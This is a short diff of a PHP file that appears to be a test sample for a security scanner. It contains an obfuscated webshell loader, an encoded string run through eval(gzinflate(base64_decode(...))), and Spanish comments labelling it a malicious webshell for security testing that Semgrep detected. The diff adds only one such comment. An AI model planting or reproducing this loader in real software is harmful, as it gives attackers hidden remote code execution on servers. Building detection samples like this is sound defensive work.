@@ -4,3 +4,4 @@ $stt0 = "==AB1pAIf8fzbDNlGpNlHdHnjbosfs/x9Ldw9d4F9n/4jejGiMGfFOfVI9cBlMDS5AFXuDr
 eval(htmlspecialchars_decode(gzinflate(base64_decode($stt1))));
 ?><!-- Webshell maliciosa para prueba de seguridad -->
 <!-- Vulnerabilidad detectada por Semgrep -->
+<!-- Archivo vulnerable - prueba de seguridad -->
